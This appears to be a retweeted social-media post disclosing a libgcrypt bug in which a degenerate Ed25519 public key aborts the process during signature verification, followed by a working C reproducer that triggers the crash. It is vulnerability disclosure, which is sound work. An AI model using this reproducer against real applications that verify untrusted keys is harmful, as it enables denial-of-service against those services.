RT @lukOlejnik: I reported this security bug to libgcrypt. The bug allowed an attacker to supply a degenerate/small-order Ed25519 public key that passes the initial curve check but triggers a fatal log_bug during signature verification, aborting the entire process. This enables a reliable denial-of-service against applications verifying attacker-controlled keys/signatures, without requiring a valid signature.

I attach a reproducer:
#include <gcrypt.h>

static int triggerAbort(void)
{
    static const unsigned char identity[32] = {0x01};
    static const unsigned char zero[32] = {0};
    static const unsigned char encodedKey[33] = {0x40, 0x01};
    gcry_sexp_t publicKey;
    gcry_sexp_t message;
    gcry_sexp_t signature;

    gcry_check_version(NULL);
    gcry_sexp_build(
        &publicKey, NULL,
        "(public-key(ecc(curve Ed25519)(flags eddsa)(q %b)))",
        (int)sizeof(encodedKey), encodedKey);
    gcry_sexp_build(
        &message, NULL,
        "(data(flags eddsa)(hash-algo sha512)(value %b))",
        0, identity);
    gcry_sexp_build(
        &signature, NULL,
        "(sig-val(eddsa(r %b)(s %b)))",
        32, identity, 32, zero);

    return gcry_pk_verify(signature, message, publicKey);
}

int main(void)
{
    return triggerAbort();
}
